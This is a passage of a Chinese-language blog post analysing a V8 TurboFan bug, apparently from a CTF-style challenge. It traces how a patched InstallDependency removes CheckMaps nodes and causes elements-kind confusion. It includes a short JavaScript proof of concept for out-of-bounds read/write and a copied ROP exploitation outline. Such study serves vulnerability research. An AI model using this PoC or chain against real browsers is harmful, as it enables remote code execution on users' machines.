&#125;</span><br><span class="line">     delete[] old_realms;</span><br><span class="line">   &#125;</span><br><span class="line">-  Local&lt;ObjectTemplate&gt; global_template = CreateGlobalTemplate(isolate);</span><br><span class="line">   Local&lt;Context&gt; context =</span><br><span class="line">-      Context::New(isolate, nullptr, global_template, global_object);</span><br><span class="line">+      Context::New(isolate, nullptr, ObjectTemplate::New(isolate), v8::MaybeLocal&lt;Value&gt;());</span><br><span class="line">   DCHECK(!try_catch.HasCaught());</span><br><span class="line">   if (context.IsEmpty()) return MaybeLocal&lt;Context&gt;();</span><br><span class="line">   InitializeModuleEmbedderData(context);</span><br></pre></td></tr></table></figure>
+<p>第一个<code>Patch</code>是把<code>InstallDependency</code>函数给清空了。暂且还不知道第二个函数的作用是什么，貌似是禁用了<code>wasm</code>。</p>
+<p>看第一个<code>Patch</code>函数的交叉引用，可以发现被大量<code>compilation-dependencies.cc</code>函数中的<code>Install</code>函数引用。因为是在<code>v8/src/compiler</code>之中所以可以确定和<code>Turbofan</code>有关，继续看<code>Install</code>函数的交叉引用，可以发现一个<code>StableMapDependency</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class StableMapDependency final : public CompilationDependency &#123;</span><br><span class="line"> public:</span><br><span class="line">  explicit StableMapDependency(const MapRef&amp; map) : map_(map) &#123;</span><br><span class="line">    DCHECK(map_.is_stable());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bool IsValid() const override &#123; return map_.object()-&gt;is_stable(); &#125;</span><br><span class="line"></span><br><span class="line">---&gt;  void Install(const MaybeObjectHandle&amp; code) const override &#123;</span><br><span class="line">        SLOW_DCHECK(IsValid());</span><br><span class="line">---&gt;    DependentCode::InstallDependency(map_.isolate(), code, map_.object(),</span><br><span class="line">                                     DependentCode::kPrototypeCheckGroup);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> private:</span><br><span class="line">  MapRef map_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>继续看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void CompilationDependencies::DependOnStableMap(const MapRef&amp; map) &#123;</span><br><span class="line">  if (map.CanTransition()) &#123;</span><br><span class="line">    RecordDependency(new (zone_) StableMapDependency(map));</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    DCHECK(map.is_stable());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当看<code>DependOnStableMap</code>的引用时可以发现很多引用到的。其中有一个<code>BuildCheckMaps</code>的函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">void PropertyAccessBuilder::BuildCheckMaps(</span><br><span class="line">    Node* receiver, Node** effect, Node* control,</span><br><span class="line">    ZoneVector&lt;Handle&lt;Map&gt;&gt; const&amp; receiver_maps) &#123;</span><br><span class="line">  HeapObjectMatcher m(receiver);</span><br><span class="line">  if (m.HasValue()) &#123;</span><br><span class="line">    MapRef receiver_map = m.Ref(broker()).map();</span><br><span class="line">    if (receiver_map.is_stable()) &#123;</span><br><span class="line">      for (Handle&lt;Map&gt; map : receiver_maps) &#123;</span><br><span class="line">        if (MapRef(broker(), map).equals(receiver_map)) &#123;</span><br><span class="line">----&gt;          dependencies()-&gt;DependOnStableMap(receiver_map);</span><br><span class="line">          return;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ZoneHandleSet&lt;Map&gt; maps;</span><br><span class="line">  CheckMapsFlags flags = CheckMapsFlag::kNone;</span><br><span class="line">  for (Handle&lt;Map&gt; map : receiver_maps) &#123;</span><br><span class="line">    MapRef receiver_map(broker(), map);</span><br><span class="line">    maps.insert(receiver_map.object(), graph()-&gt;zone());</span><br><span class="line">    if (receiver_map.is_migration_target()) &#123;</span><br><span class="line">      flags |= CheckMapsFlag::kTryMigrateInstance;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *effect = graph()-&gt;NewNode(simplified()-&gt;CheckMaps(flags, maps), receiver,</span><br><span class="line">                             *effect, control);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该函数，如果<code>map</code>是<code>stable map</code>，那么可以替换为<code>DependOnStableMap</code>回调到<code>map</code>中。否则就新建<code>CheckMaps</code>结点。</p>
+<p>再看看该函数引用，可以在<code>js-native-context-specialization.cc</code>中的<code>ReduceElementAccess</code>发现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Reduction JSNativeContextSpecialization::ReduceElementAccess(</span><br><span class="line">    Node* node, Node* index, Node* value,</span><br><span class="line">    ElementAccessFeedback const&amp; processed) &#123;</span><br><span class="line">  DisallowHeapAccessIf no_heap_access(FLAG_concurrent_inlining);</span><br><span class="line">  DCHECK(node-&gt;opcode() == IrOpcode::kJSLoadProperty ||</span><br><span class="line">         node-&gt;opcode() == IrOpcode::kJSStoreProperty ||</span><br><span class="line">         node-&gt;opcode() == IrOpcode::kJSStoreInArrayLiteral ||</span><br><span class="line">         node-&gt;opcode() == IrOpcode::kJSHasProperty);</span><br><span class="line"></span><br><span class="line">  Node* receiver = NodeProperties::GetValueInput(node, 0);</span><br><span class="line">  Node* effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">  Node* control = NodeProperties::GetControlInput(node);</span><br><span class="line">  Node* frame_state =</span><br><span class="line">      NodeProperties::FindFrameStateBefore(node, jsgraph()-&gt;Dead());</span><br><span class="line"></span><br><span class="line">  AccessMode access_mode = processed.keyed_mode.access_mode();</span><br><span class="line">  if ((access_mode == AccessMode::kLoad || access_mode == AccessMode::kHas) &amp;&amp;</span><br><span class="line">      receiver-&gt;opcode() == IrOpcode::kHeapConstant) &#123;</span><br><span class="line">    Reduction reduction = ReduceElementLoadFromHeapConstant(</span><br><span class="line">        node, index, access_mode, processed.keyed_mode.load_mode());</span><br><span class="line">    if (reduction.Changed()) return reduction;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  ------------</span><br><span class="line">  </span><br><span class="line">    // TODO(turbofan): The effect/control linearization will not find a</span><br><span class="line">    // FrameState after the StoreField or Call that is generated for the</span><br><span class="line">    // elements kind transition above. This is because those operators</span><br><span class="line">    // don&apos;t have the kNoWrite flag on it, even though they are not</span><br><span class="line">    // observable by JavaScript.</span><br><span class="line">    effect =</span><br><span class="line">        graph()-&gt;NewNode(common()-&gt;Checkpoint(), frame_state, effect, control);</span><br><span class="line"></span><br><span class="line">    // Perform map check on the &#123;receiver&#125;.</span><br><span class="line">    access_builder.BuildCheckMaps(receiver, &amp;effect, control,</span><br><span class="line">                                  access_info.receiver_maps());</span><br></pre></td></tr></table></figure>
+<p>所以说，当<code>map</code>是<code>stable map</code>时，我们可以把<code>check map</code>结点给去掉，这时候再去更改<code>element kind</code>就可以造成<code>element kind confusion</code>。</p>
+<h4 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">var a = [1.1,2];</span><br><span class="line"></span><br><span class="line">a.x = 1;</span><br><span class="line"></span><br><span class="line">function test(idx) &#123;</span><br><span class="line">    return a[idx];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (i = 0; i &lt; 0x100000; i++)&#123;</span><br><span class="line">    var data = test(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a[10000] = 1;</span><br><span class="line"></span><br><span class="line">print(test(100));</span><br></pre></td></tr></table></figure>
+<p>即可越界读写。</p>
+<p>利用的话就摘抄了一下，现在还不懂这利用是什么原理（用的并不是<code>wasm</code>，是一种新方法）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. leak a binary pointer from the heap</span><br><span class="line">2. read pointer to kernel32 from IAT</span><br><span class="line">3. read kernelbase pointer from IAT of kernel32</span><br><span class="line">4. There&apos;s a stack pointer stored in a struct at KERNELBASE!BasepCurrentTopLevelFilter+8</span><br><span class="line">5. ROP</span><br></pre></td></tr></table></figure>
+<h3 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h3><ol>
+<li><a href="https://googleprojectzero.blogspot.com/2019/05/" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2019/05/</a></li>
+<li><a href="https://ssd-disclosure.com/archives/3379" target="_blank" rel="noopener">https://ssd-disclosure.com/archives/3379</a></li>
+<li><a href="https://v8.dev/blog/elements-kinds" target="_blank" rel="noopener">https://v8.dev/blog/elements-kinds</a></li>
+</ol>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持v1nke</div>
+        <ul>
+        
+          <li class="item">
+            <span>微信扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+          <li class="item">
+            <span>支付宝扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2019/07/27/CVE-2019-5786/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2019/08/17/Math.expm1分析/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
